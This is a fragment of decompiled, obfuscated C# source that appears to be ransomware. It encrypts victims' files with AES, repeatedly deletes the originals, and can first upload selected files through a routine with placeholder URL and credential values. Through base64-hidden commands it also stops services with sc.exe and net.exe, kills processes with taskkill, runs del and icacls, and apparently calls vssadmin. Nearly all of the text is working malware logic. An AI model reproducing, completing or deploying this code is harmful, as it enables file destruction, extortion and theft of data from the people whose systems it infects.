									lPoyIxkPQfSfzaP(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, bytes2);
								}
							}
						}
						end_IL_04c2_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0a2b;
			IL_0a2b:
			CS_0024_003C_003E8__locals0.TEsRQlBGMsrM.Remove(CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
		});
	}

	private static void FKKdtpPOXcixG(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (XiSfijQzOr == "YES")
					{
						foreach (string item in HLlzhaBALyehKMW)
						{
							if (string_0.ToLower().EndsWith(item) && LNfftKTeaLEJxe == "YES")
							{
								if (Convert.ToInt32(jUyryfTlTABVm) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && LNfftKTeaLEJxe == "NO")
							{
								try
								{
									BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(".part"))
					{
						File.Move(string_1, string_1.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void aaxjshgqLTvRmFF(string string_0, string string_1, byte[] byte_0)
	{
		if (XiSfijQzOr == "YES")
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in HLlzhaBALyehKMW)
			{
				if (string_0.ToLower().EndsWith(item) && LNfftKTeaLEJxe == "YES")
				{
					if (Convert.ToInt32(jUyryfTlTABVm) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && LNfftKTeaLEJxe == "NO")
				{
					try
					{
						BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = rkaJvaLxSApP.XSSYjgejGHjLCQ(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
		}
	}

	private static void IbxvsuFDJGCHw(string string_0, string string_1, byte[] byte_0)
	{
		tsCGCqSymQuu CS_0024_003C_003E8__locals0 = new tsCGCqSymQuu();
		CS_0024_003C_003E8__locals0.UZavYxvKDEAva = string_0;
		CS_0024_003C_003E8__locals0.vxjqxeajvIhW = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string vxjqxeajvIhW = CS_0024_003C_003E8__locals0.vxjqxeajvIhW;
			FileStream fileStream = new FileStream(vxjqxeajvIhW, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (KGlWteEpKYfz == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.UZavYxvKDEAva, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.UZavYxvKDEAva, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.UZavYxvKDEAva, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.vxjqxeajvIhW.Length > 0)
				{
					if (XiSfijQzOr == "YES")
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.UZavYxvKDEAva, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in HLlzhaBALyehKMW)
						{
							if (CS_0024_003C_003E8__locals0.UZavYxvKDEAva.ToLower().EndsWith(item) && LNfftKTeaLEJxe == "YES")
							{
								if (Convert.ToInt32(jUyryfTlTABVm) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.UZavYxvKDEAva);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.UZavYxvKDEAva.ToLower().EndsWith(item) && LNfftKTeaLEJxe == "NO")
							{
								try
								{
									BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.UZavYxvKDEAva);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.UZavYxvKDEAva);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.vxjqxeajvIhW.EndsWith(".part"))
					{
						File.Move(CS_0024_003C_003E8__locals0.vxjqxeajvIhW, CS_0024_003C_003E8__locals0.vxjqxeajvIhW.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.vxjqxeajvIhW))
							{
								File.Delete(CS_0024_003C_003E8__locals0.vxjqxeajvIhW);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (vQOhJPfkmenqxsh)
			{
				try
				{
					File.AppendAllText(OpWBXzCwVRYsxq, "File: " + CS_0024_003C_003E8__locals0.UZavYxvKDEAva + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__9()
	{
		List<string> source = lsWtVCsEzBTL;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				uATAppcKlZ("sc.exe", string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		List<string> source2 = yYvMwQIIRucF;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
			{
				uATAppcKlZ("net.exe", string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
		List<string> source3 = vptJpYJhZlMRM;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
			{
				uATAppcKlZ(oMKRHTBqYRfOk("dGFza2tpbGwuZXhl"), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
		if (VnmuFCXwLb == "YES")
		{
			string[] olEsalIPJXyhSZEgg = OlEsalIPJXyhSZEgg;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
				{
					uATAppcKlZ(oMKRHTBqYRfOk("dGFza2tpbGwuZXhl"), "/IM " + string_0 + " /f");
				};
			}
			Parallel.ForEach(olEsalIPJXyhSZEgg, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
		}
		if (!OLRxBoNESYHA().Contains("XP"))
		{
			EnvRhAFwnNeKeW(PgMUbAxWXI);
		}
		else
		{
			List<string> jNcObsVMzwaXqv = JNcObsVMzwaXqv;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
				{
					uATAppcKlZ(oMKRHTBqYRfOk(IPHxEYiEhccEgJV("lhXZu4WatRWYzNnd")), string_0);
				};
			}
			Parallel.ForEach(jNcObsVMzwaXqv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		}
		List<string> source4 = aNwBUUqhGtLFvJ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b = delegate(string string_0)
			{
				uATAppcKlZ(oMKRHTBqYRfOk("ZGVsLmV4ZQ=="), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b);
		List<string> source5 = uGHBYLBfRrA;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c = delegate(string string_0)
			{
				uATAppcKlZ("icacls", string_0);
			};
		}
		Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		uATAppcKlZ("sc.exe", string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		uATAppcKlZ("net.exe", string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		uATAppcKlZ(oMKRHTBqYRfOk("dGFza2tpbGwuZXhl"), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		uATAppcKlZ(oMKRHTBqYRfOk("dGFza2tpbGwuZXhl"), "/IM " + string_0 + " /f");
	}

	private static void _003CMain_003Eb__e(string string_0)
	{
		uATAppcKlZ(oMKRHTBqYRfOk(IPHxEYiEhccEgJV("lhXZu4WatRWYzNnd")), string_0);
	}

	private static void _003CMain_003Eb__f(string string_0)
	{
		uATAppcKlZ(oMKRHTBqYRfOk("ZGVsLmV4ZQ=="), string_0);
	}

	private static void _003CMain_003Eb__10(string string_0)
	{
		uATAppcKlZ("icacls", string_0);
	}

	private static void _003CCrypt_003Eb__27()
	{
		dpxXqfoOJPmxWa.SqJQCZvGgamgp();
	}
}
